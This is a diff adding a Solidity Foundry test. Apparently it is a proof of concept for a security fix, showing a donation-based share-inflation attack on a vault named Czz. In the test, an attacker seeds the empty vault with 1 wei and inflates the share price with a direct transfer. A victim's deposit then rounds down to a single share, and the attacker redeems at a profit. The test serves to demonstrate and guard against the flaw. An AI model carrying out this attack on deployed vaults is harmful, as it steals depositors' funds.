@@ -1,0 +1,57 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+import {Test} from "forge-std/Test.sol";
+import {Czz} from "../src/Czz.sol";
+
+contract MockERC20 {
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+    function mint(address to, uint256 a) external { balanceOf[to] += a; }
+    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
+    function transfer(address to, uint256 a) external returns (bool) {
+        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
+    }
+    function transferFrom(address f, address to, uint256 a) external returns (bool) {
+        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[to] += a; return true;
+    }
+}
+
+/// @notice PoC: passes on the ORIGINAL vault, fails on the PATCHED one.
+///         The attacker seeds the empty vault with 1 wei, donates a large amount
+///         straight to the vault to inflate the share price, and a later honest
+///         deposit rounds down to a single share. The attacker then redeems its
+///         one share and walks away with the pool, including the victim's deposit.
+contract PocTest is Test {
+    Czz internal vault;
+    MockERC20 internal asset;
+    address internal attacker = makeAddr("attacker");
+    address internal victim = makeAddr("victim");
+
+    function setUp() public {
+        asset = new MockERC20();
+        vault = new Czz(address(asset));
+        asset.mint(attacker, 1 + 1e18); // 1 wei seed + 1e18 donation
+        asset.mint(victim, 2e18);
+    }
+
+    function test_donationInflationStealsDeposit() public {
+        vm.startPrank(attacker);
+        asset.approve(address(vault), 1);
+        vault.fzzDeposit(1); // one share in an empty vault
+        asset.transfer(address(vault), 1e18); // donation inflates the share price
+        vm.stopPrank();
+
+        vm.startPrank(victim);
+        asset.approve(address(vault), 2e18);
+        vault.fzzDeposit(2e18); // rounds down against the inflated price
+        vm.stopPrank();
+
+        uint256 attackerShares = vault.vzzShares(attacker); // read before pranking fzzRedeem
+        vm.prank(attacker);
+        vault.fzzRedeem(attackerShares);
+
+        uint256 supplied = 1 + 1e18; // everything the attacker ever put in
+        assertGt(asset.balanceOf(attacker), supplied, "attacker profited from the victim's deposit");
+    }
+}
